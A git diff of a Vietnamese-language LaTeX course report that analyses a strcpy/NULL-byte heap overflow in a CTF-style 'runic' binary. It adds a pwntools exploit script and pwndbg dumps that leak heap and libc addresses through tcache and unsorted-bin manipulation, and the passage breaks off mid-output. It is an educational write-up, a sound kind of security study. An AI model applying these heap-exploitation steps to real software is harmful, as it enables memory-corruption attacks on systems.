@@ -51,6 +51,24 @@
   columns=fullflexible
 }
 
+% Define Python style for listings
+\lstdefinestyle{pythonstyle}{
+  language=Python,
+  basicstyle=\small\ttfamily,
+  keywordstyle=\color{blue}\bfseries,
+  commentstyle=\color{gray},
+  stringstyle=\color{red},
+  breaklines=true,
+  showstringspaces=false,
+  backgroundcolor=\color{codebg},
+  frame=single,
+  framesep=5pt,
+  xleftmargin=0.5cm,
+  xrightmargin=0.5cm,
+  columns=fullflexible,
+  literate={'}{\textquotesingle}1
+}
+
 \title{
     \huge Báo cáo đồ án môn An toàn và an ninh mạng\\
     \large Lớp học phần: INT3307E 1\\
@@ -290,7 +308,7 @@ unsigned __int64 create()
 
 Hàm \texttt{create()} cung cấp chức năng tạo một rune mới. Người dùng nhập \texttt{name} dài tối đa \texttt{8} bytes. Giá trị index được tính thông qua hàm băm \texttt{hash(name)}, cho thấy chương trình đang triển khai một cấu trúc Hash Table.
 
-Sau khi tính toán index, chương trình kiểm tra con trỏ \texttt{content} của rune tương ứng để nhằm xác định tên đã được sử dụng hay chưa. Nếu con trỏ \texttt{content} khác Null (đã được sử dụng), thông báo "That rune name is already in use!" được in ra và hàm kết thúc. Ngược lại, người dùng tiếp tục nhập vào độ dài nội dung, tối đa \texttt{0x60} bytes.
+Sau khi tính toán index, chương trình kiểm tra con trỏ \texttt{content} của rune tương ứng để nhằm xác định tên đã được sử dụng hay chưa. Nếu con trỏ \texttt{content} khác NULL (đã được sử dụng), thông báo "That rune name is already in use!" được in ra và hàm kết thúc. Ngược lại, người dùng tiếp tục nhập vào độ dài nội dung, tối đa \texttt{0x60} bytes.
 
 Một chunk (vùng nhớ) sẽ được cấp phát trên heap với kích thước bằng độ dài của nội dung được nhập cộng thêm \texttt{8} bytes, được trỏ đến bởi con trỏ \texttt{content}. Các giá trị được sao chép vào các trường tương ứng trong cấu trúc rune. Đặc biệt, trường \texttt{name} được sao chép thêm một lần nữa vào vị trí bắt đầu của chunk, còn nội dung sẽ được ghi vào tại vị trí offset là \texttt{8}. 
 
@@ -349,7 +367,7 @@ unsigned __int64 delete()
 
 Hàm \texttt{delete()} cho phép người dùng xoá một rune. Hàm yêu cầu nhập \texttt{name} để tính toán index trong mảng \texttt{MainTable[]} thông qua hàm \texttt{hash()}.
 
-Hàm được triển khai một cách an toàn. Trước khi thực hiện \texttt{free()}, con trỏ \texttt{content} được kiểm tra được so sánh với Null nhằm tránh lỗ hổng Double Free. Nếu con trỏ \texttt{content} là Null, thông báo "There's no rune with that name!" được in ra và hàm kết thúc. Ngược lại, chương trình thực hiện giải phóng \texttt{free(content)}, và đặt toàn bộ dữ liệu của phần tử rune tương ứng về Null thông qua \texttt{memset()}, tránh được lỗ hổng User After Free.
+Hàm được triển khai một cách an toàn. Trước khi thực hiện \texttt{free()}, con trỏ \texttt{content} được kiểm tra được so sánh với NULL nhằm tránh lỗ hổng Double Free. Nếu con trỏ \texttt{content} là NULL, thông báo "There's no rune with that name!" được in ra và hàm kết thúc. Ngược lại, chương trình thực hiện giải phóng \texttt{free(content)}, và đặt toàn bộ dữ liệu của phần tử rune tương ứng về NULL thông qua \texttt{memset()}, tránh được lỗ hổng User After Free.
 
 \subsection{\texttt{show()} Function}
 
@@ -448,7 +466,7 @@ Sau 3 thao tác trên, sơ đồ trông như sau:
 \begin{figure}[H]
 \centering
 \includegraphics[width=\linewidth]{images/image-1.png}
-\caption{Hình ảnh minh họa 1}
+\caption{Trạng thái ban đầu: Rune A trỏ đến chunk C, Rune B chưa có chunk}
 \end{figure}
 
 \begin{lstlisting}
@@ -462,7 +480,7 @@ Tiếp theo, chương trình sao chép trường \texttt{*content} và \texttt{l
 \begin{figure}[H]
 \centering
 \includegraphics[width=\linewidth]{images/image-2.png}
-\caption{Hình ảnh minh họa 2}
+\caption{Sau khi sao chép con trỏ \texttt{content} và \texttt{length} từ Rune A sang Rune B}
 \end{figure}
 
 \begin{lstlisting}
@@ -470,12 +488,12 @@ old_index = hash(old_name);
 memset(MainTable[old_index], 0, 20u);
 \end{lstlisting}
 
-Tiếp theo, chương trình xóa bỏ nội dung ở rune A (đặt về Null):
+Tiếp theo, chương trình xóa bỏ nội dung ở rune A (đặt về NULL):
 
 \begin{figure}[H]
 \centering
 \includegraphics[width=\linewidth]{images/image-3.png}
-\caption{Hình ảnh minh họa 3}
+\caption{Sau khi xóa nội dung Rune A (memset về NULL)}
 \end{figure}
 
 \begin{lstlisting}
@@ -488,29 +506,29 @@ Tiếp theo, chương trình tính \texttt{current\_index} dựa vào nội dung
 \begin{figure}[H]
 \centering
 \includegraphics[width=\linewidth]{images/image-4.png}
-\caption{Hình ảnh minh họa 4}
+\caption{Tính \texttt{current\_index} dựa trên \texttt{hash(content)} và ghi dữ liệu vào \texttt{content + 8}}
 \end{figure}
 
 Tại đây, thay vì sử dụng \texttt{new\_index} để lấy trường \texttt{length}, chương trình lại tính \texttt{current\_index} dựa trên \texttt{hash(content)} - tên đã được sao chép vào chunk C thông qua \texttt{strcpy(content, new\_name)}.
 
-Cần lưu ý rằng \texttt{new\_name} ban đầu được nhập vào thông qua \texttt{read(0, new\_name, 8u)}. Hàm \texttt{read()} thông thường ngừng đọc khi đã đọc đủ số lượng bytes được chỉ định trong tham số hoặc gặp EOF, không quan tâm đến ký tự null hay ký tự xuống dòng. Trong khi đó, \texttt{strcpy()} ngừng sao chép khi đã đủ ký tự hoặc gặp ký tự null trong chuỗi nguồn.
+Cần lưu ý rằng \texttt{new\_name} ban đầu được nhập vào thông qua \texttt{read(0, new\_name, 8u)}. Hàm \texttt{read()} thông thường ngừng đọc khi đã đọc đủ số lượng bytes được chỉ định trong tham số hoặc gặp EOF, không quan tâm đến ký tự NULL hay ký tự xuống dòng. Trong khi đó, \texttt{strcpy()} ngừng sao chép khi đã đủ ký tự hoặc gặp ký tự NULL trong chuỗi nguồn.
 
-Do đó, việc sử dụng \texttt{strcpy()} không đảm bảo sao chép toàn bộ tên, vì tên được nhập có thể chứa ký tự null ở giữa. Điều này dẫn đến việc tính toán hash có thể bị sai lệch, khiến \texttt{current\_index} không phải là \texttt{new\_index}. Kết quả là việc lấy trường \texttt{length} tại \texttt{MainTable[current\_index]->length} cũng có thể cho ra giá trị nhỏ hơn hoặc lớn hơn độ dài thực tế.
+Do đó, việc sử dụng \texttt{strcpy()} không đảm bảo sao chép toàn bộ tên, vì tên được nhập có thể chứa ký tự NULL ở giữa. Điều này dẫn đến việc tính toán hash có thể bị sai lệch, khiến \texttt{current\_index} không phải là \texttt{new\_index}. Kết quả là việc lấy trường \texttt{length} tại \texttt{MainTable[current\_index]->length} cũng có thể cho ra giá trị nhỏ hơn hoặc lớn hơn độ dài thực tế.
 
-Cùng xem xét một ví dụ sau, giả sử hiện đang có rune thứ nhất với tên \texttt{\textbackslash x01}, được ánh xạ đến index 1, và rune thứ hai với tên \texttt{\textbackslash x02}, được ánh xạ đến index 2.
+Cùng xem xét một ví dụ sau (Figure 11), giả sử hiện đang có rune thứ nhất với tên \texttt{\textbackslash x01}, được ánh xạ đến index 1, và rune thứ hai với tên \texttt{\textbackslash x02}, được ánh xạ đến index 2.
 
 \begin{figure}[H]
 \centering
 \includegraphics[width=\linewidth]{images/image-5.png}
-\caption{Hình ảnh minh họa 5}
+\caption{Ví dụ minh họa: Trạng thái ban đầu với hai rune có tên \texttt{\textbackslash x01} và \texttt{\textbackslash x02}}
 \end{figure}
 
-Tiếp theo, chúng ta thực hiện edit rune thứ nhất với tên mới là \texttt{new\_name = \textbackslash x02\textbackslash x00\textbackslash x01}. Tên mới này sẽ được ánh xạ tới \texttt{new\_index} là 3. Tuy nhiên, do tên mới chứa null byte ở giữa, khi tên mới được sao chép vào chunk, \texttt{strcpy()} chỉ lấy đến \texttt{\textbackslash x02} và kết thúc tại null terminator.
+Tiếp theo, chúng ta thực hiện edit rune thứ nhất với tên mới là \texttt{new\_name = \textbackslash x02\textbackslash x00\textbackslash x01}. Tên mới này sẽ được ánh xạ tới \texttt{new\_index} là 3. Tuy nhiên, do tên mới chứa NULL byte ở giữa, khi tên mới được sao chép vào chunk, \texttt{strcpy()} chỉ lấy đến \texttt{\textbackslash x02} và kết thúc tại NULL terminator.
 
 \begin{figure}[H]
 \centering
 \includegraphics[width=\linewidth]{images/image-6.png}
-\caption{Hình ảnh minh họa 6}
+\caption{Sau khi edit với \texttt{new\_name} chứa NULL byte, \texttt{strcpy()} chỉ sao chép đến \texttt{\textbackslash x02}}
 \end{figure}
 
 Vậy \texttt{current\_index} không phải là 3 mà là 2, dẫn đến việc lấy ra \texttt{length2} thay vì \texttt{length}. Trong trường hợp \texttt{length2} lớn hơn \texttt{length}, lệnh \texttt{read(0, content + 8, MainTable[current\_index]->length)} có thể gây ra heap buffer overflow. Lỗ hổng này cho phép kẻ tấn công ghi đè để giả mạo kích thước, con trỏ \texttt{fd}, con trỏ \texttt{bk} của chunk liền sau, hoặc có thể làm rò rỉ địa chỉ trên heap và địa chỉ trong thư viện libc.
@@ -520,11 +538,649 @@ ASLR (Address Space Layout Randomization) là cơ chế bảo vệ ngẫu nhiên
 \clearpage
 \section{Exploitation}
 
+Quá trình khai thác được thực hiện thông qua một exploit script viết bằng Python sử dụng framework \texttt{pwntools}. Script này (đặt tên là \texttt{solve.py}) cung cấp các hàm tiện ích để tương tác với chương trình mục tiêu một cách có cấu trúc và dễ dàng. Các hàm wrapper được định nghĩa bao gồm \texttt{create()} để tạo rune mới, \texttt{delete()} để xóa rune, \texttt{edit()} để chỉnh sửa rune, và \texttt{show()} để hiển thị nội dung rune.
+
+\begin{lstlisting}[style=pythonstyle]
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("runic_patched", checksec=False)
+libc = ELF("libc.so.6", checksec=False)
+ld = ELF("ld.so", checksec=False)
+
+context.terminal = ["tilix", "-a", "session-add-right", "-e"]
+context.binary = exe
+
+sla = lambda p, d, x: p.sendlineafter(d, x)
+sa = lambda p, d, x: p.sendafter(d, x)
+sl = lambda p, x: p.sendline(x)
+s = lambda p, x: p.send(x)
+
+slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
+san = lambda p, d, n: p.sendafter(d, str(n).encode())
+sln = lambda p, n: p.sendline(str(n).encode())
+sn = lambda p, n: p.send(str(n).encode())
+
+ru = lambda p, x: p.recvuntil(x)
+rl = lambda p: p.recvline()
+rc = lambda p, n: p.recv(n)
+rr = lambda p, t: p.recvrepeat(timeout=t)
+ra = lambda p, t: p.recvall(timeout=t)
+ia = lambda p: p.interactive()
+
+gdbscript = '''
+set follow-fork-mode parent
+set detach-on-fork on
+continue
+'''
+
+def conn():
+    if args.LOCAL:
+        p = process([exe.path])
+        if args.GDB:
+            gdb.attach(p, gdbscript=gdbscript)
+        if args.DEBUG:
+            context.log_level = 'debug'
+        return p
+    else:
+        host = ""
+        port = 0
+        return remote(host, port)
+
+p = conn()
+
+def create(name, length, contents):
+    sla(p, b'Action:', b'1')
+    sa(p, b'name:', name)
+    sla(p, b'length:', str(length).encode())
+    if length > 0:
+        sa(p, b'contents:', contents)
+
+def delete(name):
+    sla(p, b'Action:', b'2')
+    sa(p, b'name:', name)
+
+def edit(old_name, new_name, contents):
+    sla(p, b'Action:', b'3')
+    sa(p, b'Rune name:', old_name)
+    sa(p, b'New name:', new_name)
+    sa(p, b'Rune contents: \n', contents)
+
+def show(name):
+    sla(p, b'Action:', b'4')
+    sa(p, b'Rune name:', name)
+    ru(p, b'Rune contents:\n\n')
+    return rl(p).strip()
+
+# code goes here...
+
+ia(p)
+\end{lstlisting}
+
+Script có thể được thực thi với các chế độ hoạt động khác nhau thông qua tham số dòng lệnh:
+
+\begin{itemize}
+  \item \textbf{LOCAL}: Kết nối đến process đang chạy trên máy cục bộ thay vì kết nối remote đến server.
+  \item \textbf{GDB}: Gắn pwndbg vào process đang chạy, hiển thị giao diện debug trên terminal bên phải nhằm hỗ trợ phân tích và theo dõi quá trình thực thi.
+  \item \textbf{DEBUG}: In ra các thông tin chi tiết trong quá trình tương tác với process, bao gồm dữ liệu được gửi đi và nhận về.
+  \item \textbf{NOASLR}: Tạm thời vô hiệu hóa cơ chế bảo vệ ASLR, ngăn chặn việc ngẫu nhiên hóa địa chỉ của heap và libc khi debug với GDB.
+\end{itemize}
+
+Hình dưới đây minh họa cách thực thi script với các tham số phù hợp:
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=\linewidth]{images/image-13.png}
+\caption{Ví dụ chạy script khai thác}
+\end{figure}
+
 \subsection{Leaking Heap Address}
+
+Bước đầu tiên trong chuỗi khai thác là leak địa chỉ heap nhằm bypass cơ chế ASLR. Kỹ thuật này dựa trên việc lợi dụng cấu trúc tcache bin của ptmalloc. Cụ thể, khi một chunk được giải phóng vào tcache, ptmalloc sẽ ghi con trỏ \texttt{fd} (forward pointer) vào chunk đó, trỏ đến chunk tiếp theo trong bin hoặc NULL nếu đây là chunk duy nhất.
+
+Chiến lược khai thác như sau: đầu tiên, cấp phát hai chunk liền kề nhau trên heap, sau đó giải phóng chunk thứ hai vào tcache bin. Tiếp theo, khai thác lỗ hổng buffer overflow trong hàm \texttt{edit()} để ghi tràn từ chunk thứ nhất sang chunk thứ hai, ghi đè trường \texttt{size} để loại bỏ NULL terminator giữa hai chunk. Cuối cùng, khi gọi hàm \texttt{show()} trên chunk thứ nhất, hàm \texttt{puts()} sẽ in liên tục cho đến khi gặp NULL byte, leak cả con trỏ \texttt{fd} của chunk thứ hai. Từ địa chỉ này, có thể tính ngược lại để xác định địa chỉ cơ sở của heap.
+
+Để thực hiện kỹ thuật này trong thực tế, cần cấp phát ba chunk với cấu hình như sau:
+
+\begin{itemize}
+  \item Chunk với \texttt{name=\textbackslash x01} được gọi là chunk 1.
+  \item Chunk với \texttt{name=\textbackslash x02} được gọi là chunk 2.
+  \item Chunk với \texttt{name=\textbackslash x03\textbackslash x00\textbackslash x01} được gọi là chunk 301.
+\end{itemize}
+
+\begin{lstlisting}[style=pythonstyle]
+create(b'\x01', 0x10, b'A')
+create(b'\x02', 0x10, b'A')
+create(b'\x03', 0x60, b'A')
+
+delete(b'\x02')
+\end{lstlisting}
+
+Chunk 3 được tạo với kích thước lớn (\texttt{0x60}) nhằm khai thác lỗ hổng: sau khi giải phóng chunk 2 vào tcache bin, chunk 1 sẽ được chỉnh sửa với tên mới để "mượn" kích thước lớn của chunk 3, cho phép ghi tràn sang chunk 2. Trạng thái heap sau khi giải phóng chunk 2 có thể quan sát qua pwndbg:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> x/50gx 0x55555555c290
+0x55555555c290: 0x0000000000000000 0x0000000000000021  # <-- chunk 1
+0x55555555c2a0: 0x0000000000000001 0x0000000000000041
+0x55555555c2b0: 0x0000000000000000 0x0000000000000021  # <-- chunk 2
+0x55555555c2c0: 0x000000055555555c 0xb7a28a32de447efd
+0x55555555c2d0: 0x0000000000000000 0x0000000000000071  # <-- chunk 3
+0x55555555c2e0: 0x0000000000000003 0x0000000000000041
+0x55555555c2f0: 0x0000000000000000 0x0000000000000000
+0x55555555c300: 0x0000000000000000 0x0000000000000000
+0x55555555c310: 0x0000000000000000 0x0000000000000000
+0x55555555c320: 0x0000000000000000 0x0000000000000000
+0x55555555c330: 0x0000000000000000 0x0000000000000000
+0x55555555c340: 0x0000000000000000 0x0000000000020cc1  # <-- top chunk
+0x55555555c350: 0x0000000000000000 0x0000000000000000
+0x55555555c360: 0x0000000000000000 0x0000000000000000
+0x55555555c370: 0x0000000000000000 0x0000000000000000
+0x55555555c380: 0x0000000000000000 0x0000000000000000
+\end{lstlisting}
+
+Chunk 2 đã được đưa vào tcache bin (entry size \texttt{0x20}) như sau tại Figure 14, và ptmalloc đã ghi con trỏ \texttt{fd} với giá trị \texttt{0x000000055555555c} vào vị trí dữ liệu của chunk này.
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.75\linewidth]{images/image-14.png}
+\caption{Tcache bin entry}
+\end{figure}
+
+Tiếp theo, thực hiện edit chunk 1 với tên mới \texttt{\textbackslash x03\textbackslash x00\textbackslash x01}. Do tên này chứa NULL byte ở giữa, khi \texttt{strcpy()} sao chép vào chunk, nó chỉ lấy \texttt{\textbackslash x03}, dẫn đến \texttt{current\_index} được tính dựa trên hash của \texttt{\textbackslash x03} thay vì \texttt{\textbackslash x03\textbackslash x00\textbackslash x01}. Kết quả là chunk 1 được phép ghi với độ dài lớn hơn (kích thước của chunk 3), cho phép ghi đè 24 byte qua trường size của chunk 2.
+
+\begin{lstlisting}[style=pythonstyle]
+edit(b'\x01', b'\x03\x00\x01', b'A' * 24)
+\end{lstlisting}
+
+Heap hiện tại trông như sau:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> x/16gx 0x55555555c290
+0x55555555c290: 0x0000000000000000 0x0000000000000021  # <-- chunk 1
+0x55555555c2a0: 0x0000000000000001 0x4141414141414141
+0x55555555c2b0: 0x4141414141414141 0x4141414141414141  # <-- chunk 2
+0x55555555c2c0: 0x000000055555555c 0xb7a28a32de447efd
+0x55555555c2d0: 0x0000000000000000 0x0000000000000071  # <-- chunk 3
+0x55555555c2e0: 0x0000000000000003 0x0000000000000041
+0x55555555c2f0: 0x0000000000000000 0x0000000000000000
+0x55555555c300: 0x0000000000000000 0x0000000000000000
+\end{lstlisting}
+
+Khi gọi \texttt{show()} trên chunk 1, hàm \texttt{puts()} sẽ in liên tục qua cả chunk 2, leak được con trỏ \texttt{fd} có giá trị \texttt{0x000000055555555c}.
+
+Cần lưu ý rằng từ glibc phiên bản 2.32 trở đi, con trỏ \texttt{fd} trong tcache đã được mã hóa bằng cơ chế Safe-Linking theo công thức $\text{PROTECT}(P) = (L \gg 12) \oplus P$, trong đó $L$ là địa chỉ trên heap mà con trỏ \texttt{fd} được ghi vào và $P$ là giá trị thực cần được bảo vệ. Tuy nhiên, do chunk 2 là chunk duy nhất trong tcache bin này, con trỏ \texttt{fd} của nó trỏ tới NULL ($P = 0$), dẫn đến giá trị được mã hóa chính là $L \gg 12$.
+
+Vì tất cả địa chỉ trong cùng một memory page (4KB) đều có 12 bit thấp khác nhau nhưng các bit cao giống nhau, việc dịch phải 12 bit sẽ có được địa chỉ cơ sở của page đó. Do đó, từ giá trị leak được, chỉ cần dịch trái 12 bit để thu được địa chỉ heap base. Sau khi hoàn tất việc leak, chunk 2 được cấp phát lại để dọn dẹp tcache bin và giữ heap trong trạng thái sạch sẽ cho các bước tiếp theo.
+
+\begin{lstlisting}[style=pythonstyle]
+heap_base = u64(show(b'\x03\x00\x01')[24:].ljust(8, b'\0')) << 12
+print(f"heap base: {hex(heap_base)}")
+create(b'\x02', 0x10, b'A')
+\end{lstlisting}
+
+Kết quả leak được xác nhận qua lệnh \texttt{vmmap} trong pwndbg:
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=\linewidth]{images/image-15.png}
+\caption{Xác nhận heap base address}
+\end{figure}
 
 \subsection{Leaking Libc Address}
 
+Bước tiếp theo là leak địa chỉ libc để có thể gọi các hàm nguy hiểm hệ thống. Để thực hiện điều này, cần giải phóng một chunk vào unsorted bin, nơi ptmalloc sẽ ghi các con trỏ \texttt{fd} và \texttt{bk} trỏ về main arena (nằm trong vùng nhớ của libc).
+
+Tuy nhiên, chương trình có những hạn chế khiến việc này không trực tiếp: kích thước cấp phát tối đa chỉ là \texttt{0x60} bytes, quá nhỏ để tự động đưa vào unsorted bin (cần lớn hơn \texttt{0x410} bytes). Ngoài ra, không thể lợi dụng cơ chế tcache-full vì các chunk kích thước nhỏ hơn \texttt{0x80} bytes sẽ rơi vào fastbin thay vì unsorted bin.
+
+Giải pháp là tiếp tục khai thác lỗ hổng buffer overflow để kích thước của một chunk thành \texttt{0x410} bytes. Khi chunk này được giải phóng, ptmalloc sẽ coi nó đủ lớn và đưa vào unsorted bin. Sau đó, cấp phát lại một phần nhỏ của chunk để leak con trỏ \texttt{fd}, từ đó tính được địa chỉ base của libc.
+
+Triển khai cụ thể như sau: cấp phát ba chunk mới (chunk 5, 6, 7). Chunk 5 sẽ được dùng để overflow vào chunk 6, ghi đè trường \texttt{size} thành \texttt{0x421}. Chunk 6 được chọn có kích thước \texttt{0x60} bytes để sau khi giải phóng vào unsorted bin, có thể cấp phát lại một phần nhỏ (\texttt{0x10} bytes) tránh heap bị corrupt quá nhiều.
+
+\begin{lstlisting}[style=pythonstyle]
+create(b'\x05', 0x10, b'A')
+create(b'\x06', 0x60, b'A')
+create(b'\x07', 0x60, b'A')
+
+edit(b'\x05', b'\x07\x00\x01', b'A' * 16 + p64(0x421))
+
+delete(b'\x06')
+\end{lstlisting}
+
+Tuy nhiên, khi thử giải phóng chunk 6, chương trình bị terminate bởi glibc với lỗi "double free or corruption (!prev)" như sau ở Figure 16:
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=\linewidth]{images/image-16.png}
+\caption{Lỗi double free khi giải phóng chunk 6}
+\end{figure}
+
+Nguyên nhân là cơ chế kiểm tra an toàn của ptmalloc. Khi giải phóng một chunk vào unsorted bin, ptmalloc kiểm tra \texttt{prev\_inuse} bit của chunk "liền sau" để đảm bảo chunk hiện tại đang được sử dụng (không bị double free). Điểm quan trọng: vị trí chunk "liền sau" không phải là chunk kế tiếp trong bộ nhớ, mà được tính bằng công thức: $\text{next\_chunk} = \text{current\_chunk} + \text{current\_size}$.
+
+Trạng thái heap sau khi ghi đè \texttt{size} của chunk 6 thành \texttt{0x420}:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> x/50gx 0x55555555c290                                     
+0x55555555c290: 0x0000000000000000 0x0000000000000021             
+0x55555555c2a0: 0x0000000000000003 0x4141414141414141             
+0x55555555c2b0: 0x4141414141414141 0x4141414141414141             
+0x55555555c2c0: 0x0000000555550002 0x0000000000000041             
+0x55555555c2d0: 0x0000000000000000 0x0000000000000071             
+0x55555555c2e0: 0x0000000000000003 0x0000000000000041             
+0x55555555c2f0: 0x0000000000000000 0x0000000000000000             
+0x55555555c300: 0x0000000000000000 0x0000000000000000             
+0x55555555c310: 0x0000000000000000 0x0000000000000000             
+0x55555555c320: 0x0000000000000000 0x0000000000000000             
+0x55555555c330: 0x0000000000000000 0x0000000000000000             
+0x55555555c340: 0x0000000000000000 0x0000000000000021  # <-- chunk 5
+0x55555555c350: 0x0000000000000007 0x4141414141414141
+0x55555555c360: 0x4141414141414141 0x0000000000000421  # <-- chunk 6
+0x55555555c370: 0x0000000000000006 0x0000000000000041
+0x55555555c380: 0x0000000000000000 0x0000000000000000
+0x55555555c390: 0x0000000000000000 0x0000000000000000
+0x55555555c3a0: 0x0000000000000000 0x0000000000000000
+0x55555555c3b0: 0x0000000000000000 0x0000000000000000
+0x55555555c3c0: 0x0000000000000000 0x0000000000000000
+0x55555555c3d0: 0x0000000000000000 0x0000000000000071  # <-- chunk 7
+0x55555555c3e0: 0x0000000000000007 0x0000000000000041
+0x55555555c3f0: 0x0000000000000000 0x0000000000000000
+0x55555555c400: 0x0000000000000000 0x0000000000000000
+0x55555555c410: 0x0000000000000000 0x0000000000000000
+\end{lstlisting}
+
+Với chunk 6 có \texttt{size = 0x421}, ptmalloc tính địa chỉ chunk tiếp theo:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> p/x 0x55555555c360 + 0x420
+$1 = 0x55555555c780
+\end{lstlisting}
+
+Tại địa chỉ này không có dữ liệu gì (toàn NULL), nên \texttt{prev\_inuse} bit bằng \texttt{0}, khiến ptmalloc nghĩ chunk 6 đã được giải phóng trước đó:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> x/10gx 0x55555555c780
+0x55555555c780: 0x0000000000000000 0x0000000000000000
+0x55555555c790: 0x0000000000000000 0x0000000000000000
+0x55555555c7a0: 0x0000000000000000 0x0000000000000000
+0x55555555c7b0: 0x0000000000000000 0x0000000000000000
+0x55555555c7c0: 0x0000000000000000 0x0000000000000000
+\end{lstlisting}
+
+Giải pháp: cấp phát nhiều chunk để "lấp đầy" vùng nhớ từ chunk 7 đến địa chỉ \texttt{0x55555555c780}, sau đó ghi một chunk header giả tại đó với \texttt{prev\_inuse} bit được set (LSB của \texttt{size} = 1):
+
+\begin{lstlisting}[style=pythonstyle]
+create(b'\x05', 0x10, b'A')
+create(b'\x06', 0x60, b'A')
+create(b'\x07', 0x60, b'A')
+
+create(b'\x09', 0x60, b'A')
+create(b'\x10', 0x60, b'A')
+create(b'\x11', 0x60, b'A')
+create(b'\x12', 0x60, b'A')
+create(b'\x13', 0x60, b'A')
+create(b'\x14', 0x60, b'A')
+create(b'\x15', 0x60, b'A')
+create(b'\x16', 0x60, p64(0) * 4 + b'A')
+
+edit(b'\x05', b'\x07\x00\x01', b'A' * 16 + p64(0x421))
+\end{lstlisting}
+
+Sau khi cấp phát các chunk này, heap layout sẽ có chunk header giả tại \texttt{0x55555555c780}:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> x/50gx 0x55555555c290
+0x55555555c290:	0x0000000000000000	0x0000000000000021
+0x55555555c2a0:	0x0000000000000003	0x4141414141414141
+0x55555555c2b0:	0x4141414141414141	0x4141414141414141
+0x55555555c2c0:	0x0000000555550002	0x0000000000000041
+0x55555555c2d0:	0x0000000000000000	0x0000000000000071
+0x55555555c2e0:	0x0000000000000003	0x0000000000000041
+0x55555555c2f0:	0x0000000000000000	0x0000000000000000
+0x55555555c300:	0x0000000000000000	0x0000000000000000
+0x55555555c310:	0x0000000000000000	0x0000000000000000
+0x55555555c320:	0x0000000000000000	0x0000000000000000
+0x55555555c330:	0x0000000000000000	0x0000000000000000
+0x55555555c340:	0x0000000000000000	0x0000000000000021 # <-- chunk 5
+0x55555555c350:	0x0000000000000007	0x4141414141414141
+0x55555555c360:	0x4141414141414141	0x0000000000000421 # <-- chunk 6
+0x55555555c370:	0x0000000000000006	0x0000000000000041
+0x55555555c380:	0x0000000000000000	0x0000000000000000
+0x55555555c390:	0x0000000000000000	0x0000000000000000
+0x55555555c3a0:	0x0000000000000000	0x0000000000000000
+0x55555555c3b0:	0x0000000000000000	0x0000000000000000
+0x55555555c3c0:	0x0000000000000000	0x0000000000000000
+0x55555555c3d0:	0x0000000000000000	0x0000000000000071 # <-- chunk 7
+0x55555555c3e0:	0x0000000000000007	0x0000000000000041
+...
+pwndbg> 
+0x55555555c750:	0x0000000000000000	0x0000000000000071
+0x55555555c760:	0x0000000000000016	0x0000000000000000
+0x55555555c770:	0x0000000000000000	0x0000000000000000
+0x55555555c780:	0x0000000000000000	0x0000000000000041 # <-- "next chunk"
+0x55555555c790:	0x0000000000000000	0x0000000000000000
+0x55555555c7a0:	0x0000000000000000	0x0000000000000000
+0x55555555c7b0:	0x0000000000000000	0x0000000000000000
+0x55555555c7c0:	0x0000000000000000	0x0000000000020841
+0x55555555c7d0:	0x0000000000000000	0x0000000000000000
+0x55555555c7e0:	0x0000000000000000	0x0000000000000000
+\end{lstlisting}
+
+Bây giờ ptmalloc tìm thấy một chunk header hợp lệ tại \texttt{0x55555555c780} với \texttt{prev\_inuse} bit được set (\texttt{0x41}), cho phép giải phóng chunk 6 vào unsorted bin thành công. Sau đó, cấp phát lại một phần nhỏ:
+
+\begin{lstlisting}[style=pythonstyle]
+delete(b'\x06')
+create(b'\x06', 0x10, b'A')
+\end{lstlisting}
+
+Chunk 6 gốc (kích thước \texttt{0x420}) được split: \texttt{0x20} bytes đầu được cấp phát lại, phần còn lại (\texttt{0x400} bytes) quay trở lại unsorted bin. Heap layout hiện tại trông như sau:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> x/50gx 0x55555555c290
+0x55555555c290:	0x0000000000000000	0x0000000000000021
+0x55555555c2a0:	0x0000000000000003	0x4141414141414141
+0x55555555c2b0:	0x4141414141414141	0x4141414141414141
+0x55555555c2c0:	0x0000000555550002	0x0000000000000041
+0x55555555c2d0:	0x0000000000000000	0x0000000000000071
+0x55555555c2e0:	0x0000000000000003	0x0000000000000041
+0x55555555c2f0:	0x0000000000000000	0x0000000000000000
+0x55555555c300:	0x0000000000000000	0x0000000000000000
+0x55555555c310:	0x0000000000000000	0x0000000000000000
+0x55555555c320:	0x0000000000000000	0x0000000000000000
+0x55555555c330:	0x0000000000000000	0x0000000000000000
+0x55555555c340:	0x0000000000000000	0x0000000000000021 # <-- chunk 5
+0x55555555c350:	0x0000000000000007	0x4141414141414141
+0x55555555c360:	0x4141414141414141	0x0000000000000021 # <-- chunk 6 (current)
+0x55555555c370:	0x00001555553f0006	0x00001555553f3041
+0x55555555c380:	0x000055555555c360	0x0000000000000401 # <-- remainder in unsorted bin
+0x55555555c390:	0x00001555553f2cc0	0x00001555553f2cc0
+0x55555555c3a0:	0x0000000000000000	0x0000000000000000
+0x55555555c3b0:	0x0000000000000000	0x0000000000000000
+0x55555555c3c0:	0x0000000000000000	0x0000000000000000
+0x55555555c3d0:	0x0000000000000000	0x0000000000000071 # <-- chunk 7
+0x55555555c3e0:	0x0000000000000007	0x0000000000000041
+0x55555555c3f0:	0x0000000000000000	0x0000000000000000
+0x55555555c400:	0x0000000000000000	0x0000000000000000
+0x55555555c410:	0x0000000000000000	0x0000000000000000
+\end{lstlisting}
+
+Quan trọng nhất, tại offset \texttt{0x10} trong remainder chunk (\texttt{0x55555555c390}), là con trỏ \texttt{fd} trỏ về main arena: \texttt{0x00001555553f2cc0}. Gọi \texttt{show()} để leak địa chỉ này. Từ địa chỉ này, tính offset để tìm libc base:
+
+\begin{lstlisting}[style=pythonstyle]
+pwndbg> vmmap libc.so.6
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+►   0x155555200000     0x15555522c000 r--p    2c000       0 libc.so.6
